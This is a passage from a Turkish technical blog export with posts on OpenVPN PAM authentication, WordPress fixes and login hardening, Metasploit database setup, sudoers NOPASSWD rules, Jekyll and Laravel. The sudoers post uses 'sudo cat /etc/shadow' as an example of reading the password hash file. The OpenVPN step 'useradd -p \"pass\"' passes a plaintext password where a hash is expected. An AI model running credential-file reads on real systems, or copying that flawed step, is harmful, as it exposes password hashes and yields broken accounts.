-----END CERTIFICATE----- </cert> <key> -----BEGIN PRIVATE KEY----- . . . -----END PRIVATE KEY----- </key> Burada en önemli nokta dosya içeriklerini kopyalarken tüm dosya içeriğini kopyaladığınızdan emin olun. Artık tek bir dosya üzerinden başarılı bir şekilde vpnimizi kullanabiliyoruz. Linux Kullanıcısı ile Authentication Burada başarılı bir şekilde vpne bağlandık. Dikkat ederseniz herhangi bir username pass sormadan doğrudan sunucuya bağlanabildik. Ama bu istenen bir durum değildir. Yani .ovpn dosyanız başkasının eline geçerse eğer bu kişi vpninize bağlanabilir. Bunun önüne geçmek için Linux kullanıcısı ile authentication sağlayacağız. İlk önce sunucu tarafında bu işlemi eklenti ile sağlamalıyız. Bunun için ilk önce /etc/pam.d dizini içerisinde dosya oluşturuyoruz. touch /etc/pam.d/openvpn Daha sonra bu dosya içerisine şu satırları yazıyoruz. auth required pam_unix.so shadow nodelay account required pam_unix.so Şimdi vpne bağlanacak herhangi bir user oluşturmalıyız. useradd -s /usr/sbin/nologin -p \"pass\" test2 Burada dikkat etmemiz gereken nokta -s parametresi ile nologin bir user oluşturmamızdır. Yani bu şekilde oluşturduğumuz kullanıcı ssh ile sisteme bağlanamaz. Bu user sadece vpni kullanabilecektir. openvpn bu authentication sağlayabilmesi için hali hazırda gelen \"openvpn-plugin-auth-pam\" eklentisini kullanacağız. vim /etc/openvpn/server.conf Dosya içerisinde herhangi bir yere şu satırı ekliyoruz. plugin /usr/lib/openvpn/plugins/openvpn-plugin-auth-pam.so openvpn Openvpni yeniden başlatalım. service openvpn restart service openvpn status Bu işlemlerden sonra az önceki gibi kullanıcı tarafında vpne bağlanmaya çalışırsanız. Hata alırsınız ve bağlanamazsınız. Bağlanırken kullanıcı adı ve şifreyi de göndermeliyiz. Bunun için kullanıcı tarafına indirdiğimiz client.ovpn dosyasını açıyoruz ve şu satırı ekliyoruz. Bu işlemlerden sonra az önceki gibi kullanıcı tarafında vpne bağlanmaya çalışırsanız. Hata alırsınız ve bağlanamazsınız. Bağlanırken kullanıcı adı ve şifreyi de göndermeliyiz. Bunun için kullanıcı tarafına indirdiğimiz client.ovpn dosyasını açıyoruz ve şu satırı ekliyoruz. auth-user-pass Bu satırı ekledikten sonra vpne bağlanmaya çalışırken size username, pass soracaktır. Doğru bir username, pass girmeniz halinde başarılı bir şekilde vpn bağlanabilirsiniz.","tags":"Linux","title":"Ubuntu 14.04 üzerine OPENVPN Kurulumu"},{"url":"http://www.mazlumagar.com/wordpress-tum-eklentileri-etkisizlestirme.html","text":"Merhaba, bugün başıma gelen bir olayı sizinle paylaşmak istiyorum. Wordpress'te eğer bir eklenti kurduktan sonra beyaz sayfa hatası ile karşılaşırsanız, bunun sebebi o eklentinin wordpressin kullandığınız sürümü ile uyumsuz olması olabilir. Yapmanız gereken eklentiyi etkisizleştirmektir. Bunu yapabilmek için admin paneline ulaşmanız gerekiyor ve ulaşamıyorsunuz. Bundan dolayı eklentileri etkisizleştirme işlemini mysql ile yapacağız. Sunucuya bağlandıktan sonra mysql kabuğuna girin. $ mysql -u root - Kabuğa düştükten sonra wordpress için kullandığınız database'i seçin use database_adi; Ardından aşağıdaki sorguyu çalıştırdığınızda aktif olan eklentileri görebilirsiniz. SELECT * FROM wp_options WHERE option_name = 'active_plugins'; Bizim burada yapacağımız işlem ise tüm eklentileri şu sorgu ile etkisizleştirmek. UPDATE wp_options SET option_value = '' WHERE option_name = 'active_plugins'; Bu işlemden sonra web sitenizin tekrardan sorunsuz bir şekilde çalışıyor olması gerekli. Unutmayın ki bu işlem ile kullandığınız tüm eklentileri etksizleştirdik. Admin paneline girerek kullanmak istediğiniz eklentileri tekrardan aktif hale getirebilirsiniz.","tags":"Wordpress","title":"Wordpress Tüm Eklentileri Etkisizleştirme"},{"url":"http://www.mazlumagar.com/wordpress-login-sayfasi-guvenligi.html","text":"Siz de benim gibi bir wordpress kullanıcısı iseniz admin paneli için yapmanızı şiddetle önerdiğim iki şey bulunmaktadır. 1. Google noCAPTCHA reCAPTCHA Wordpress admin paneli giriş sayfasında brute force ataklar için herhangi bir önlem bulunmamaktadır. Zaten bundan dolayı da bir çok wordpress olan sitelerin hacklenmesi ve index basılması gibi durumlar son derece yaygın. Yani sitenizi hacklemek isteyen kişi herhangi bir tool çalıştırarak bir kaç saat içerisinde kullanıcı adı ve şifrenizi elde edebilir. Bunu engellemek için yapmamız gereken sadece Google's No CAPTCHA reCAPTCHA eklentisini sitenize kurmanız. Kurduktan sonra sol taraftaki menüde No CAPTCHA reCAPTCHA sekmesini göreceksiniz. O sayfaya girdiğiniz zaman sizden site key ve secret key olmak üzere iki tane alan doldurmanızı isteyecektir. Bu keyleri Google'ın kendisinden ediniyoruz. https://www.google.com/recaptcha/intro/index.html adresine girerek yukarıdaki get reCAPTCHA butonuna tıklayarak yeni bir kayıt oluşturduğunuz zaman size keylerinizi verecektir. Display Settings kısmında ise CAPTCHA'nın nerelerde görünmesini istediğimizi belirtiyoruz. Burada bizim için önemli olan Login Form, siz isterseniz yorumlar içinde aktif hale getirebilirsiniz. Formu kaydettikten sonra işlem tamam demektir. Artık Login Form sayfasında CAPTCHA görebilirsiniz. 2. Google Authenticator Bunu burada uzun uzun açıklamayacağım. Mehmet hocanının bu konu ile ilgili güzel bir yazısı bulunmaktadır. Yazıya buradan ulaşabilirsiniz. Bu iki işlemi yaptıktan sonra login sayfanız güvenli olacaktır. Diğer Öneriler Bu eklentilerin yanında önerebileceğim iki eklenti daha var. Limit Attempts eklentisi ile login sayfasında yanlış giriş denemeleri sonucundan ne olacağını belirlememizi sağlıyor. Örneğin 3 kere yanlış kullanıcı adı şifre deneme sonucunda ipyi 15 dk engelle gibi bir yapılandırma yapabiliyoruz. Protect Wp Admin eklentisi ise admin sayfasının urlini değiştirebiliyor. Wordpress'de varsayılan olarak /wp-admin/ olarak gelmektedir. Bu eklenti ile örneğin bunu /yonetim/ olarak değiştirebilirsiniz.","tags":"Güvenlik","title":"Wordpress Login Sayfası Güvenliği"},{"url":"http://www.mazlumagar.com/metasploit-veritabani-baglantisi.html","text":"Bu yazıda çok kısa bir şekilde metasploiti nasıl veritabanına bağlayacağımızdan bahsedeceğim. Metasploit nedir? Nasıl kurulur? gibi konular hakkında hiç bir fikriniz yoksa https://www.mehmetince.net/metasploit-modulu-gelistirme-serisi-gelistirme-ortaminin-kurulmasi yazısını okuyarak işe başlayabilirsiniz. root@kali:~#msfconsole msf > db_status [*] postgresql selected, no connection Eğer bu sonucu aldıysanız veritabanı bağlantısı yok demektir. Bunun için terminalde sırası ile şu komuları çalıştırın. service postgresql start service metasploit start Bu komutlar kali üzerinde sizin işinizi görecek ve database ile bağlantı gerçekleşecektir. msf > db_status [*] postgresql connected to msf3 Şimdi ubuntu 14.04 üzerine indirdiyseniz metasploiti database ile bağlayalım. Metasploit postgresql kullandığı için ilk önce sisteminizde kurulu değilse kurulumunu yapmalısınız. sudo apt-get install postgresql sudo service postgresql start Kurulumu yaptığımıza göre metasploitin varsayılan kullanıcının şifresini değiştirelim. sudo passwd postgres Enter new UNIX password: sifre Retype new UNIX password: sifre_tekrar passwd: password updated successfully Daha sonra postgresql kullanıcına geçerek metasploit için bir kullanıcı ve database oluşturacağız. mazlum@mazlum metasploit-framework (master) $ su postgres Password: Metasploit için postgresql kullanıcısı oluşturalım. postgres@mazlum:/home/mazlum/tools/metasploit-framework$ createuser kullanici_adi -P Enter password for new role: sifre Enter it again: sifre_tekrar Metasploit için veritabanı oluşturalım. postgres@mazlum:/home/mazlum/tools/metasploit-framework$ createdb --owner=kullanici_adi database_adi Database'i de oluşturduğumuza göre artık metasploite geçebiliriz. mazlum@mazlum metasploit-framework (master) $ ./msfconsole -L Oluşturduğumuz database ile metasploiti bağlayalım. msf > db_connect kullanici_adi:kullanici_sifresi[at]127.0.0.1:5432database_adi msf > db_status [*] postgresql connected to msfdb Başarılı bir şekilde bağlantıyı gerçekleştirdik. Ama bu durumda metasploitten çıkıp tekrar girerseniz bağlantı kopmuş olacaktır. Bağlantının otomatik olabilmesi için /metasploit-framework/config/database.yml dosyası configure edilmelidir. config dizini içerisinde database.example.yml dosyası bulunmaktadır. Bu dosyanın adını değiştirebilirsiniz. İçeriğine de daha önce oluşturduğumuz postgresql bilgilerini giriniz. development: &pgsql adapter: postgresql database: database_adi username: postgresql_kullanicisi password: postgresql_kullanici_sifresi host: localhost port: 5432 pool: 5 timeout: 5 Bu işlemden sonra metasploit çalıştırıldığında otomatik olarak veritabanı bağlantısı gerçekleşecektir. msf > db_status [*] postgresql connected to msfdb","tags":"Güvenlik","title":"Metasploit Veritabanı Bağlantısı"},{"url":"http://www.mazlumagar.com/linux-sifresiz-root-komutu-calistirma.html","text":"Merhabalar bu yazıda Linux'un sudoers dosyasından çok kısaca bahsedeceğim. Bu dosya ile kullanıcı yetkilendirme yapabiliyoruz. Varsayılan dosya içeriğine bakarsanız root kullanıcısının tüm yetkilere sahip olduğunu görebilirsiniz. Eğer herhangi bir kullanıcının yetkileri oynamak isterseniz bu dosya üzerinde değişiklikler yapabilirsiniz. Ben bu yazıda bir kullanıcının bazı komutları çalıştırırken root şifresi istenmeden çalıştırabilmesini sağlayacağım. Örneğin komut satırından cat /etc/shadow komutunu çalıştırırsanız. Eğer root değilseniz yetkiniz olmadığı için hata alırsınız. Aynı komutu sudo cat /etc/shadow şeklinde çalıştırırsanız bu sefer root şifrenizi girmeniz gerekir. İşte bu durumda şifre sormadan doğrudan komut çalıştırmak isterseniz soduers dosyasını düzenleyebilirsiniz. sudoers dosyası /etc/ dizini içerisindedir. sudoers dosyasını düzenlemek için ise visudo komutu kullanılır. Bu komut ile dosya varsayılan editör ile düzenlenmek üzere açılır. sudo visudo Dosyayı incelediğiniz zaman root ALL=(ALL:ALL) ALL root amcaya tüm yetkilerin verildiğini görebilirsiniz. Aynısını sizde istediğiniz bir kullanıcı için yapabilirsiniz. mazlum ALL=(ALL:ALL) ALL mazlum kullanıcısı artık tüm yetkilere sahip. Bunun dışında bir kullanıcı için komutların şifresiz bir şekilde çalıştırılabilmesini sağlayabilirsiniz. mazlum ALL = (ALL) NOPASSWD: /sbin/reboot Bu satırı sudoers dosyasına eklerseniz mazlum kullanıcısı reboot komutunu çalıştırırken herhangi bir şifre sorulmayacaktır. Bu işlemin daha düzgün halini şu şekilde kullanabilirsiniz. User_Alias KULLANICI = kullaniciadi Cmnd_Alias KOMUTLAR = /sbin/iptables, /sbin/ifconfig, /sbin/route KULLANICI ALL = (ALL) NOPASSWD: KOMUTLAR Artık kullanici için komutlar değişkenine atılan her komut şifre istenmeden çalıştırılacaktır. **User\\_Alias :** Kullanıcı değişkeni oluşturmak için, **Cmnd\\_Alias :** Komut değişkeni oluşturmak için Buradaki değişken isimleri büyük harf olmak zorundadır. mazlum@mazlum ~ $ sudo iptables Not: Komutlar şifresiz çalıştırılıyor olsa bile komut başında sudo ifadesi yazılmalıdır.","tags":"Linux","title":"Linux Şifresiz Root Komutu Çalıştırma"},{"url":"http://www.mazlumagar.com/jekyll-ile-github-uzerinde-blog-olusturma.html","text":"Github kendi hesabınıza özel sayfa oluşturmanıza olanak sağlıyor. Bunun için ilk önce kullanici_adi.github.io adında bir repository oluşturmamız gerekiyor. Bu repository'i oluşturduktan sonra http://kullanici_adi.github.io ile ulaşılabilir sayfa elde etmiş olacağız. Eğer oluşturduğunuz sayfanın dinamik olmasını istiyorsanız herhangi bir html dosyası oluşturarak push'layabilirsiniz. html içeriği sayfanızda görüntülenecektir. Veya oluşturmak için Github'dan yardım alabilirsiniz. Bunun için repository'i oluşturduktan sonra yan menüden Settings sekmesine tıklayın. Gelen sayfada Github Pages başlığı altında Automatic Page Genarator butonu göreceksiniz bu butona tıkladıktan sonra Github sizden sayfanız ile ilgili bir kaç bilgi isteyecek, bu bilgileri girdikten ve kendinize göre bir tema seçtikten sonra işlemi tamamlarsanız Github sizin için Web Sayfanızı oluşturacaktır. Reponuzda oluşan kodları inceleyerek durumu inceleyebilirsiniz. Şimdi gelelim asıl meselemize. Jekyll ile Blog Oluşturma Github üzerinde herhangi bir programlama dili yorumlatamadığımız için Jeykll ile bloğumuzu oluşturacağız. Bunun için ilk önce http://jekyllrb.com/docs/home/ adresinden Jekyll ve gereksinimlerini(Ruby, RubyGames, Python, Nodejs ) indirmelisiniz. Eğer kurulum işlemlerini tam olarak yapmazsanız proje oluşturuken hata alırsınız. Kurulumları yaptıysanız proje oluşturabiliriz. $ jekyll new blog Bu komutu terminalden verdikten sonra bulunduğunuz dizinde blog adında bir dizin oluşacaktır. Localde çalıştırmak için dizin içerisine girelim ve gerekli komutu verelim. cd blog jekyll serve Artık projemiz localde 4000. portta çalışacaktır. Eğer protu beğenmediyseniz şu komutu çalıştırabilirsiniz. jekyll serve --port=1111 Projemizi çalıştırdığımıza göre tarayıcıdan http://0.0.0.0:4000 yazarak default olarak gelen sayfamıza ulaşabiliriz. Sayfayı ve dizin yapısını biraz kurcaladıktan sonra çok rahat fikir edineceğinizi düşünüyorum. blog/ ├── about.md ├── _config.yml ├── css │ └── main.scss ├── feed.xml ├── _includes │ ├── footer.html │ ├── ├── _layout.scss │ └── _syntax-highlighting.scss └── _site ├── about │ └── index.html ├── css │ └── main.css ├── feed.xml ├── index.html └── jekyll └── update └── 2014 └── 10 └── 25 └── welcome-to-jekyll.html Buradaki tüm dosyaları açıklamaya çalışmayacağım. Zaten hepsinin ne işe yaradığını bende daha tam olarak bilmiyorum. Ama bizim için önemli olan dizinlerden ve dosyalardan kısaca bahsedelim. Eğer biraz MVC yapısı ile uğraştıysanız bu dosya yapısı sizi korkutmayacaktır. Biz şimdi bazı dizin ve dosyaları inceleyelim. _config.yml Bizim için belkide en önemli dosya. Bu dosya içerisinde proje konfigürasyonlarını yapıyoruz. Açtığınızda title,email gibi anahtar kelimelerine değerler atandığını görebilirsiniz. Bu değerler şablo içerisinde {{ site.anahtar_adi }} şeklinde ulaşabilirsiniz. Yani buraya istediğiniz kadar tanımlama yapabilir ve ıyorum. Build İşlemi Config dosyasında değişiklerini yaptınız ve sayfayı yenilediniz. Ama hiç bir değişiklik olmadı. Değişikliklerin geçerli olabilmesi için şu komutu kullanmalısınız. $ jekyll build Site gösterilirken _site dizini içerisine göre gösterilir. Bu komut bu dizinin yeniden son değişikliklere göre oluşturulmasını sağlar. _layouts & _includes Dizinleri Bu dizinler içerisinde html sayfalarımız bulunur. Bunlardan en önemlisi defaults.html 'dir. Bu dosya bizim ana şablonumuz ( html dosyamız) olacak. Diğer sayfalar bu dosyadan kalıtım alır. Bu şekilde aynı kodları tekrar tekrar kullanmaktan kaçınmış oluruz. Eğer bu şekilde bir yapı kullanmazsak her dosyada kod yazmaya html kodlarından başlamamız gerekir. Bu dosyanın içeriğini inceleyelim. <!DOCTYPE html> < html > {% include head.html %} < body > {% include header.html %} < div class = \"page-content\" > < div class = \"wrapper\" > {{ content }} </ div > </ div > {% include footer.html %} </ body > </ html > Gördüğünüz gibi bu dosyada html taglarını açtık ve kapattık. Ana tanımlamalarımız burada. Bu dosya içerisinde {% include header.html %} satırına dikkat edin. Burada _includes dizini içerisinde bulnan header dosyasını içeri yüklemiş olduk. Bunun gibi head ve footer dosyalarını da yükledik. Burada kendi farklı dosyalarınızı oluşturabilir ve include komutu ile içeri aktarabilirsiniz. Bununla uğraşmaya ne gerek var? Ben hepsini default.html dosyasında yazarım diyebilirsiniz. Tabi ki yazabilirsiniz. Ama bu şekilde kullanım temiz ve anlaşılır kod yazmanızı sağlayacaktır. _posts Bu dizin yazılarımızın bulunduğu dizindir. İçerisini açarsanız örnek bir yazı bulunmaktadır. Yazı yazarken default olarak Markdown formatı gelmektedir. _config.yml dosyası içerisinde görebilirsiniz. Markdown syntaxına http://daringfireball.net/projects/markdown/syntax adresinden ulaşabilirsiniz. Redcarpet gibi formatlarda bulunmaktadır. Eğer isterseniz araştırabilirsiniz. Yeni Yazı Oluşturma Yeni bir yazı oluşturmak için _post dosyası içerisinde Yil-Ay-Gun-Dosya-Adi.md şablonuna uyan bir dosya oluşturuyoruz. 2014-10-25-deneme.md --- layout: post title: \"Github Deneme Yazısı\" date: 2014-10-25 20:48:00 categories: deneme --- Bu bir deneme yazısıdır. --- .... --- ifadeleri her yazıda olmak zorundadır. Bu dosyayı oluşturduktan sonra jekyll build komutunu verin. Veya servisi durdurduktan sonra jekyll serve Komutunu verirseniz build işlemi yapıldıktan sonra projeniz çalışacaktır. Proje üzerinde yazı oluşturmak bu kadar basit. Yeni Sayfa Oluşturma Yeni sayfa oluşturmanın yazı oluşturmaktan pek bir farkı yok aslında. Ana dizine içerisinde about.md dosyası bir sayfadır. Bu dosyayı incelerseniz aynı yapıda bir sayfa oluşturabilirsiniz. Biz de ana dizine ekip.md adında bir dosya oluşturuyoruz. --- layout: page title: Ekip permalink: /ekip/ --- Kimler yok ki kimler ? --- ... --- ifadeleri burada da olmak zorunda. layout ise kalıtım alacağı dosyayı belirtiyor. Projeyi yeniden başlatırsanız ekip sayfasının oluştuğunu görebilirsiniz. Son olarak ana dizinde bulunan index.html dosyasından bahsedelim. Her zamanki gibi bu dosya başlangıç dosyamız. layout dosyasından kalıtım almış ve içerisinde yazıları listeliyor. Not: Ana dizinde bulunan feed.xml dosyası bloğunuzun takip edilebilmesi içindir. Web sayfamız hazır olduğuna göre bunu artık Github'a pushlayabiliriz. Yazının en başında oluşturduğumuz repository'e pushlayacağız. Proje dizininiz içerisinde sırası ile şu komutları çalıştırın. git init git remote add origin https://github.com/mazlumagar/mazlumagar.github.io.git git add --all git commit -m\"Github Web Sayfası Oluşturuldu\" git push origin master Evet artık her şey hazır. Repository'e Github üzerinden bakarsanız dosyalarınızı görebilirsiniz. Not: Jekyll ile ilgili daha fazla temaya http://jekyllthemes.org/ adresinden ulaşabilirsiniz.","tags":"Github","title":"Jekyll ile Github üzerinde Blog Oluşturma"},{"url":"http://www.mazlumagar.com/10-laravel-migrations.html","text":"Framework'lerin en en önemli amaçlarından biride kullanıcıyı veritabanı ile muhattap etmemektedir. Yani tablo, sütün oluşturma silme gibi işlemlerin hepsini framework aracılığı ile yapabiliriz. Bu şekilde yapmak hem bizim için daha kolay olacaktır. Hemde framework yapısına uygun hareket etmiş olacağız. İşte veritabanı işlemlerini Framework aracılığı ile yapma işlemlerine Migration diyoruz. Bunun için hemen bir migration oluşturalım. Proje dizinimizde şu komutu veriyoruz. php artisan migrate:make crate_user_table --create=users Bu komut ile bir migration dosyası oluşturmuş olduk. Create parametresinden sonra tablo adını belirtmiş oluyoruz. Oluşturmuş olduğumuz dosya app/database/migrations içerisindedir. Dosyayı inceleyelim. public function up () { Schema :: create ( 'users' , function ( Blueprint $ table ) { $ table -> increments ( 'id' ); // otomatik id s ü tununu belirtir . $ table -> timestamps (); // İ ki zaman s ü t ü n ü belirtir . } ); } public function down () { Schema :: drop ( 'users' ); } Buradaki up fonksiyonu migration oluşturulurken down ise kaldırılırken çalışacaktır. Gördüğünüz gibi oluşturulan fonksiyon içerisinde belirli tanımlamalar ile geldi. Bunları değiştirebilir veya silebilirsiniz. Biz fazladan iki sütün daha ekleyeceğiz. Son hali şu şekilde olacak. $ table ->increments('id'); $ table ->string('email')->unique(); $ table ->string('password'); $ table ->timestamps(); Email sütünü ekledik. unique() metodu email adreslerinin bezersiz olacağını belirtiyor. Artık Laravel'e istediğimiz değişikliklerini yerine getirmesini söylemeliyiz. Bunun için komut satırından şu komutu veriyoruz. php artisan migrate Bu komuttan sonra değişikliklerin veritabanı içerisinde oluştuğunu göreceksiniz. users isminde sütünları ile beraber bir tablo oluşturduk. phpmyadmin, mysql workbench gibi editorler aracılığı ile kontrol edebilirsiniz. Yaptığımız migrationı geri almak istersek şu komutu çalıştırmalıyız. php artisan migrate:rollback Eğer bu komutu çalıştırdığınızda hata alırsanız. Şu komutu çalıştırdıktan sonra tekrar deneyin. composer.phar dump-autoload Bu şekilde son uyguladığımız değişiklikler veritabanından geri alınacaktır. Oluşturduğumuz users tablosu silindi. Şimdi email kısmını değiştirerek username yapalım. $ table ->increments('id'); $ table ->string('username')->unique(); $ table ->string('password'); $ table ->timestamps(); Daha sonra migrate komutunu tekrar çalıştıralım. php artisan migrate Değişikliklerimiz oluşturulmuş oldu. Şimdi tekrar email adresini eklemek için migration oluşturalım. php artisan migrate:make users-email-adresi-ekle --table=users Bu sefer migration'ın hangi tabloyu kullanacağını belirtiyoruz. Dosyamız oluştu. Dosyamızı şu hale getiriyoruz. class UsersEmailAdresiEkle extends Migration { public function up () { Schema::table ( 'users' , function ( Blueprint $table ) { $table- > string ( 'email' )-> unique ()-> after ( \"username\" ); }); } public function down () { Schema::table ( 'users' , function ( Blueprint $table ) { $table- > dropColumn ( 'email' ); }); } Kullandığımız after metodu email sütunun hangi sütundan sonra geleceğini belirtiyor. Eğer bunu kullanmazsanız en son sütün olarak eklenecektir. before kullanarak hangi sütundan önce geldiğini de belirtebilirsiniz. down fonksiyonu içerisinde hangi sütunun düzenlendiğini belirttik. Bu satırı eklemeyi unutmayın. Ardından tekrar migrate komutunu veriyoruz. php artisan migrate Artık tablomuzda email sutunuda bulunmaktadır. İşte Laravel'in Migration yapısını kullanarak veritabanı ile hiç uğraşmadan tablolarımızı oluştup, düzenleyebiliyoruz.","tags":"Php","title":"10.Laravel Migrations"},{"url":"http://www.mazlumagar.com/9-laravel-authentication-kimlik-dogrulama.html","text":"Bu yazıda Laravel ile kullanıcı girişi yapacağız. İlk bir kullanıcı oluşturalım. Route : :get ( '/' , function () { $ kullanici = new User ; $ kullanici -> username = \"laravel\" ; $ kullanici -> password = Hash :: make ( \"1234\" ); $ kullanici -> save (); } ); Tarayıcıdan ana sayfaya gidince kullanıcı oluşturulacaktır. Şimdi diğer rota tanımlamalarını yapalım. Rota tanımlamasını resource ile yapacağız. Route : :resource ( 'sessions' , 'SessionController' ); resource'nın özelliği Rota tanımlaması yaparken tüm tanımalamları yapar. Hepsine takma isimler takar SessionController dosyasında hangi metodu aramaları gerektiğini belirtir. Bunu şöyle öğrenbilirsiniz. Proje dizininde terminale giderek şu komutu çalıştırın. $ php artisan routes Gördüğünüz gibi tüm rotalar ayrıntıları ile oluşturuldu. Şimdi bu yapıya uyarak devam edelim. controllers dosyası içerisine SessionController dosyasını oluşturuyoruz. İçerisine şu kodları ekliyoruz. class SessionController extends BaseController { public function create () { if ( Auth :: check ()) return Redirect :: to ( '/admin' ); return View :: make ( \"session.create\" ); } Kullanıcı girişi yapacağımız fonksiyonu tanımladık. Bu fonksiyon ilk satırda kullanıcının giriş yapıp yapmadığını kontrol ediyor. Eğer kullanıcı giriş yaptıysa ilk if true döndürecek. Kullanıcı admin sayfasına yönlendirilecektir. Admin sayfası için rotayı basit bir şekilde tanımlayalım. Route::get('/admin', function(){ return \"Admin Sayfası\"; })->before('auth'); Burada önemli olan nokta kullanıcının giriş yapmamış ise tarayıcıdan admin sayfasının urlini girerek sayfaya ulaşamaması gerekir. Bunun için before ifadesini kullanıyoruz.Ee peki kullanıcı giriş yapmadıysa nereye yönlendirilecek? app/filters.php dosyası içerisindeki filter metodu içerisinde yönlendirilen linki bulabilirsiniz. Varsayılan olarak login sayfası gelmektedir. Biz buna dokunmayalım ve login rotasını tanımlayalım. Route : :get ( '/login' , 'SessionController@create' ); create metodundan devam edelim. Eğer giriş yapmamış ise View yüklenecektir. Burada bir ayrıntıya dikkat etmek için View tanımlamasını böyle yaptım. views dizini içerisinde session dizini oluşturun ve içerisinde create.blade.php dosyasını oluşturun. Herhangi bir dizin içerisindeki View dosyasına bu şekilde erişebiliyoruz. create.blade.php dosyasının içeriği şu şekildedir. @extends('base') @section('content') {{ Form :: open ([ 'route' => 'sessions.store' ]) }} <div> {{ Form :: label ( 'username' , 'Username :' ) }} {{ Form :: text ( 'username' ) }} </div> <div> {{ Form :: label ( 'password' , 'Password :' ) }} {{ Form :: password ( 'password' ) }} </div> <div> {{ Form :: submit ( 'Login' ) }} </div> {{ Form :: close () }} @stop Form'u session.store isimli rotaya yönlendiriyoruz. Bu rota ise SessionController içerisinde store metodunu çalıştıracak. public function store () { if ( Auth :: attempt ( Input :: only ( 'username' , 'password' ))) { return \"Hoş Geldin \" . Auth :: user () -> username ; } return Redirect : :back () - > withInput (); } Buruda post ile gelen değerlerden sadece username ve password kısımlarını alarak Auth nesnesine gönderiyoruz. attempt metodu bilgiler doğru ise kullanıcıya giriş yaptıracaktır. Giriş başarılı ise ekrana hoş geldin yazdırıyoruz. Eğer giriş başarılı değil ise metod diğer return nesnesini dönderecektir. Orada ise kullanıcıya geldiği sayfaya input nesneleri ile beraber geri yönlendiren komutu verdik. Son olarak kullanıcının çıkış yapmasını sağlayalım. Route : :get ( '/logout' , 'SessionController@destroy' ); public function destroy () { Auth :: logout (); return Redirect :: route ( 'sessions.create' ); } Kullanıcıya çıkış yaptırdıktan sonra tekrar giriş sayfasına yönlendirdik.","tags":"Php","title":"9. Laravel Authentication (Kimlik Doğrulama)"},{"url":"http://www.mazlumagar.com/8-laravel-form-validationdogrulama.html","text":"Geçen yazıda form oluşturmadan bahsetmiştik. Bu yazıda bu formun doğrulama kısmına bakacağız. kullaniciEkle metodumuzu şu hale getiriyoruz. $ validation = Validator : :make ( Input : :all (), [ 'kullaniciAdi' => 'required' , 'sifre' => 'required' ] ); if ($ validation- > fails ()) { return Redirect :: back () -> withInput () -> withErrors ( $ validation -> messages ()); } $ user = new User (); $ user- > username = Input : :get ( 'kullaniciAdi' ); $ user- > password = Hash : :make ( Input : :get ( 'sifre' )); $ kaydet = $ user- > save (); if ($ kaydet ) { return 'Kaydedildi' ; } else { return 'Kaydedilemedi' ; } Burada yaptığımız şey Validator sınıfını kullanarak kullanıcıdan aldığımız değerleri kontrol etmek. make metoduna verdiğimiz ikinci parametre kurallarımızı barındırmakta. Kural olarak ise sadece alanların zorunlu olmasını belirttik. Gördüğünüz gibi hatadan sonrada kullanıcıyı mesajlar ile beraber geldiği sayfaya yönlendiriyoruz. Bu hataları ise şu şekilde kullanıcıya gösterelim. <div> {{ Form :: label ( 'kullaniciAdi' , 'Kullanıcı Adı: ' ) }} {{ Form :: text ( 'kullaniciAdi' ) }} {{ $ errors- > first ( 'kullaniciAdi' , 'Kullanıcı adı girmek zorunludur.' ) }} </div> <div> {{ Form :: label ( 'kullaniciSifresi' , 'Kullanıcı Şifresi: ' ) }} {{ Form :: password ( 'sifre' ) }} {{ $ errors- > first ( 'sifre' , 'Şifre girmek zorunludur.' ) }} </div> View dosyamız içerisinde kullanıcıya mesaj gösterdik. Burada firts metoduna verdiğimiz ikinci parametre kullanıcıya gösterilecek mesajdır. Eğer bu parametre verilmez ise Laravel'in varsayılan mesajı gösterilir. Burada kurallarımızı ikinci parametre olarak verdik. Eğer istersek kuralları doğrudan Model dosyamız içerisinde tanımlayarak kullanabiliriz. Bunun için User Model dosyasına şu satırları ekliyoruz. 'kullaniciAdi' => 'required', 'sifre' => 'required' ]; Daha sonra Controller dosyasında şu şekilde kullanıyoruz. $ validation = Validator : :make ( Input : :all (), User ::$ kurallar ); Son olarak kontrol işlemlerini Model dosyası içerisinde oluşturduğumuz bir metod ile yapalım. User Model'ine kontrol adında bir metod ekliyoruz. public static function kontrol ($ veri ) { $ validation = Validator :: make ( $ veri , static :: $ kurallar ); if ( $ validation -> passes ()) { return true ; } static ::$ hatalar = $ validation- > messages (); return false ; } Metod içerisinde daha önce tanımlamış olduğumuz \\$kurallar değişkenini kullandığımıza dikkat edin. Ve Model yine Model dosyamız içerisinde \\$hatalar değişkenine dönen mesaj değerini atadık. Bunun için metoddan önce \\$hatalar değişkenini tanımlıyoruz. public static $ hatalar ; Son olarak metodu Controller dosyası içerisinde kullanmamız kaldı. if (! User : :kontrol ( Input : :all ())) { return Redirect :: back () -> withInput () -> withErrors ( User :: $ hatalar ); } Eğer boş bir değer göndermek isterseniz. Hatayı görebilirsiniz.","tags":"Php","title":"8. Laravel Form Validation(Doğrulama)"},{"url":"http://www.mazlumagar.com/7-laravel-form-islemleri.html","text":"Bu yazıda Laravel'in Form yapısını kullanarak kullanıcı kaydı yapacağız. İlk önce rotamızı oluşturalım. Route::get('/yeni-kullanici', array( 'as' => 'yeni-kullanici', 'uses' => 'KullaniciController@yeniKullanici' )); View dosyamızı oluşturalım. KullanıcıEkle.blade.php dosyamızın içeriği şu şekilde. @extends(\"base\") @section(\"content\") {{ Form :: open ([ 'route' => 'kullanici-ekle' ]) }} {{ Form :: label ( 'kullaniciAdi' , 'Kullanıcı Adı: ' ) }} {{ Form :: text ( 'kullaniciAdi' ) }} {{ Form :: label ( 'kullaniciSifresi' , 'Kullanıcı Şifresi: ' ) }} {{ Form :: password ( 'sifre' ) }} {{ Form :: submit ( 'Yeni Kullanıcı' ) }} {{ Form :: close () }} @stop İlk önce Form sınıfını kullanarak form'u başlatıyoruz. Daha sonra Form sınıfından istediğimiz nesneleri üretiyoruz. Örneğin bir label ürettik. İlk yazdığımız Label'in for değerini ikinicisi ile ise Value değerini belirtiyoruz. Form sınıfından text ürettik. Bu doğrudan bir input değeri text olan bir değer oluşturuyoruz. Bunu isterseniz şu şekilde de oluşturabiliriz. {{ Form :: input ( 'text' , 'kullaniciAdi' ) }} Bir textbox oluşturmak içi {{ Form :: textarea ( 'kullaniciadini giriniz' , 'kullaniciAdi' ) }} Buradaki ilk değer varsayılan değeri belirtecektir. Checkbox oluşturmak için; {{ Form :: checkbox ( 'kullaniciAdi' ) }} Form open metodundaki open(['route' => 'kullanici-ekle']) alan form post edildikten sonra gidilecek rotayı belirtir. Bu alanı kullanabilmek için rotaya isim verdik. kullanici-ekle rotasını tanımlayalım. Route::post('/kullanici-ekle', array( 'as' => 'kullanici-ekle', 'uses' => 